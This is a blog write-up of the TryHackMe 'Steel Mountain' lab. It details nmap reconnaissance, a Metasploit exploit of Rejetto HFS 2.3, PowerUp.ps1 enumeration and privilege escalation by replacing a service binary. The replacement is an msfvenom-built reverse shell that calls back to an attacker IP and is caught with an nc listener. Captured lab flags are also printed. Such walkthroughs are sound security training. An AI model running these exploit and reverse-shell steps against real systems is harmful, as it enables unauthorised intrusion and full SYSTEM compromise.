---
layout: post
title: Steel Mountain
subtitle: TryHackMe Writeup - Steel Mountain
description: A step-by-step guide to rooting the Steel Mountain machine on TryHackMe, inspired by Mr. Robot.
image: https://tryhackme-images.s3.amazonaws.com/room-icons/c9030a2b60bb7d1cf4fcb6e5032526d3.jpeg
optimized_image: https://tryhackme-images.s3.amazonaws.com/room-icons/c9030a2b60bb7d1cf4fcb6e5032526d3.jpeg
category: tryhackme
tags:
  - TryHackMe
  - Windows
  - Metasploit
  - Privilege Escalation
  - Rejetto HFS
  - PowerUp.ps1
  - Service Misconfiguration
author: mustafa_altayeb
date: 2025-08-10 00:00:00 +0000
paginate: true
---

# Steel Mountain - TryHackMe Writeup

[Steel Mountain](https://tryhackme.com/room/steelmountain) is a beginner-friendly Windows machine with a Mr. Robot theme that focuses on web exploitation and Windows privilege escalation.

**Difficulty**: Easy ⭐  
**Operating System**: Windows  
**Themes**: Web Exploitation, Privilege Escalation, Service Misconfiguration

---

## Objectives

1. Deploy the machine and connect to the network
2. Gain initial access through the web server
3. Escalate privileges to SYSTEM
4. Capture both user and root flags

---

## Reconnaissance

### Initial Nmap Scan

Started with a comprehensive Nmap scan to map the attack surface:

```bash
nmap -sC -sV -p- -T4 10.10.195.17
```

**Key Findings**:
```
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/8.5
8080/tcp  open  http               HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2025-08-07T12:53:38
|_Not valid after:  2026-02-06T12:53:38
|_ssl-date: 2025-08-08T12:55:47+00:00; 0s from scanner time.
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

### Web Enumeration

**Port 80 - IIS Server**:  
Hosts a simple employee information page featuring "Bill Harper" who is apparently on vacation.

**Port 8080 - HttpFileServer 2.3**:  
![HFS Interface](/assets/TryHackMeRoomsImage/STEELMOUNTAIN/server2.png)

HFS (HttpFileServer) version 2.3 is known to be vulnerable to Remote Code Execution. This will be our primary entry point.

---

## Initial Access

### Metasploit Exploitation

1. **Search for the exploit**:
```bash
msf6 > search rejetto
```

2. **Configure and execute**:
```bash
msf6 > use exploit/windows/http/rejetto_hfs_exec
msf6 > set RHOSTS 10.10.195.17
msf6 > set RPORT 8080
msf6 > set LHOST tun0
msf6 > set LPORT 4444
msf6 > exploit
```

3. **Successful Access**:  
The exploit works perfectly, giving us a Meterpreter session as user `steelmountain\bill`.

---

## Post-Exploitation Enumeration

### System Information
```bash
meterpreter > sysinfo
Computer        : STEELMOUNTAIN
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
```

### PowerUp.ps1 Enumeration

1. **Download PowerUp.ps1**:  
```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```

2. **Upload to target**:  
```bash
meterpreter > upload PowerUp.ps1
```

3. **Load PowerShell and run checks**:  
```bash
meterpreter > load powershell
meterpreter > powershell_shell
PS > . .\PowerUp.ps1
PS > Invoke-AllChecks
```

**Critical Finding**:
```
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : C:\Program Files (x86)\IObit\Advanced SystemCare
ModifiableFilePermissions : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName      : LocalSystem
AbuseFunction  : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart     : True
Check          : Modifiable Service Files
```

**Analysis**:  
The `AdvancedSystemCareService9` service runs as `LocalSystem` (SYSTEM privileges), and user `bill` has write permissions to its directory. Since the service can be restarted, we can replace the binary.

---

## Privilege Escalation

### Service Binary Replacement Method

1. **Generate malicious executable**:
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.86.27 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

2. **Upload to target**:
```bash
meterpreter > cd "C:\\Program Files (x86)\\IObit\\Advanced SystemCare"
meterpreter > upload Advanced.exe ASCService.exe
```

3. **Setup listener**:
```bash
nc -nvlp 4443
```

4. **Restart service**:
```bash
meterpreter > shell
C:\Program Files (x86)\IObit\Advanced SystemCare> sc stop AdvancedSystemCareService9
C:\Program Files (x86)\IObit\Advanced SystemCare> sc start AdvancedSystemCareService9
```

5. **Receive SYSTEM shell**:

```bash
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

---

## Flag Capture

### User Flag (bill)
```bash
C:\Users\bill\Desktop>type user.txt
b04763b6fcf51fcd7c13abc7db4fd365
```

### Root Flag (Administrator)
```bash
C:\Users\Administrator\Desktop>type root.txt
9af5f314f57607c00fd09803a587db80
```

---

## Key Takeaways

### Attack Path Summary:
```
External Recon → HFS 2.3 RCE → Initial Access as bill → 
Service Enumeration → Binary Replacement → SYSTEM Access
```

### Vulnerabilities Exploited:
1. **Rejetto HttpFileServer RCE** - Allowed initial access
2. **Service Misconfiguration** - Allowed privilege escalation through binary replacement

---

<iframe 
  src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" 
  style="width: 350px; height: 150px; border:none; display: block;">
</iframe>





**Find me online**:  
• TryHackMe: [t4t4r1s](https://tryhackme.com/p/t4t4r1s)  
• LinkedIn: [Mustafa Altayeb](https://www.linkedin.com/in/t4t4r1s)  
• X: [@mustafa_altayeb](https://x.com/t4t4r1s)

---
